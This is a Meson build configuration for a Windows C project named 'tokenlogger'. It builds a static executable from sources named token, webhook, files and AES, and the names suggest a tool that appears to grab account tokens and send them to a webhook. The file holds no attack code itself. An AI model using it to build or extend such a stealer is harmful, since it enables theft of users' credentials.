project('tokenlogger', 'c')

# build the executable with /MT flag instead of /MD to avoid dependency on vcruntime140.dll
add_global_arguments('/MT', language : 'c')

conf = include_directories('config')
inc = include_directories('include')

# use meson subprojects to get libcrypto dependency from openssl 
# You may need to run meson wrap install to install openssl
openssl = subproject('openssl')

cryto_dep = openssl.get_variable('libcrypto_dep')
libcrypto = declare_dependency(dependencies : [cryto_dep])

# build the executable and move it to the bin folder
exe = executable('tokeylogger', 'src/simple.c', 'config/config.c', 'src/utils.c', 'src/webhook.c', 'src/files.c', 'src/token.c', include_directories : [inc, conf], dependencies : [libcrypto], objects: 'src/aes.obj') 
